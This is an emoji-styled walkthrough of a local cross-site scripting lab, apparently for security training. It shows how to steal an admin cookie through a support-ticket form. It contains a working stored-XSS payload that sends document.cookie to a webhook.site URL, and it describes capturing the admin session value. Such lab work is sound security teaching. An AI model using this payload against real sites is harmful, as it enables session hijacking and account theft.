
# 🛡️ Lab 3: Cross-Site Scripting (XSS) Challenge Walkthrough

---

## 🖥️ Setup

- **Environment:** Utilize the Firefox container.
- **Tabs Opened:**
  1. `http://localhost/labs/x0x03.php` 📄
  2. `http://localhost/labs/x0x03_admin.php` 📄

---

## 🚀 Steps

### 1️⃣ Submitting a Support Ticket
- **Portal Description:**  
  The page invites you to submit a support ticket through a form, which promises prompt attention by the team. 🆘
- **Form Fields:**  
  Includes fields to enter a name and ticket description. 📝
- **Injected Script:**
  ```html
  <script> 
  var i = new Image; 
  i.src = "https://webhook.site/08c29163-c569-4f1c-b964-503ad450e860/?" + document.cookie;
  </script>
  ```
- **Purpose:**  
  This script creates a new image object and sets its `src` to a webhook URL, appending the document's cookie data as a query parameter. 🍪➡️🌐

---

### 2️⃣ Understanding Webhook.site
- **Description:**  
  Webhook.site allows you to test HTTP webhooks by capturing the requests sent to a unique URL.
- **Usage in XSS:**  
  Used to capture cookies transmitted via XSS. The appended `/?` ensures that the document's cookie is sent to the webhook URL.

---

### 3️⃣ Observing the Outcome
- **Admin Tab Check:**  
  After submitting the script as a ticket, switch to the admin tab (`x0x03_admin.php`). 🔄
- **Results:**  
  The submitted ticket appears empty, but checking the configured Webhook.site URL shows that an admin cookie has been successfully captured. 🎫🔍
- **Cookie Capture:**  
  Verifying in the browser’s console displays the captured cookie:
  ```javascript
  document.cookie
  // Output:
  "admin_cookie=5ac5355b84894ede056ab81b324c4675"
  ```

---

## 🎯 Conclusion
- Successfully exploited an admin cookie using an XSS vulnerability by capturing it with a webhook and verifying it in the browser's console. ✅🍪
- **Key Insight:**  
  The browser automatically executes the script upon setting the `src` property of an Image object, making a network request to the given URL without requiring explicit calls or server-side execution.

---
